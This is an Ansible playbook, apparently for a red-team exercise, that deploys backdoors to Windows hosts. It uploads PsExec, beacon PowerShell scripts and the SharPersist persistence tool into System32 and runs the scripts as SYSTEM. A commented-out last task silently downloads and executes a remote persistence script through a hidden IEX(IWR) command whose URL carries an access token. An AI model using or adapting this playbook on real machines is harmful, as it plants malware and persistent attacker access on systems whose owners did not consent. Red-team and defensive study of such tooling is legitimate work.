-
  name: Deploy Backdoors
  hosts: windows
  strategy: free
  gather_facts: no
  tasks:
    - include: tasks/upload_psexec.yaml



-
  name: Run the Bad File
  hosts: windows
  strategy: free
  gather_facts: no
  become_method: runas
  tasks:

    - name: Upload Malware
      win_copy:
        src: 'files/{{item}}'
        dest: 'C:\Windows\System32\{{item}}'
      with_items:
        - "powershellfile.ps1"
        - "powershell_Beacon.ps1"

    - name: Upload Malware
      win_copy:
        src: 'files/{{item}}'
        dest: 'C:\{{item}}'
      with_items:
        - "SharPersist.exe"


    - name:  Run Malware Files as System
      win_psexec:
        command: '{{ item }}'
        executable: C:\Windows\System32\PsExec.exe
        elevated: yes
        system: yes
        interactive: yes
      with_items:
        - "powershell.exe C:\\Windows\\System32\\powershellfile.ps1"
        - "powershell.exe C:\\Windows\\System32\\powershell_Beacon.ps1"

#    - name: Run powershell as a specific domain user
#      win_command: powershell.exe -Sta -Nop -w hidden -Command "IEX(IWR https://raw.githubusercontent.com/NotoriousRebel/deployPersist/master/persist.ps1?token=AIVA5CZTFRGLBKBBZUWQDMC5TAIA6' -UseBasicParsing)"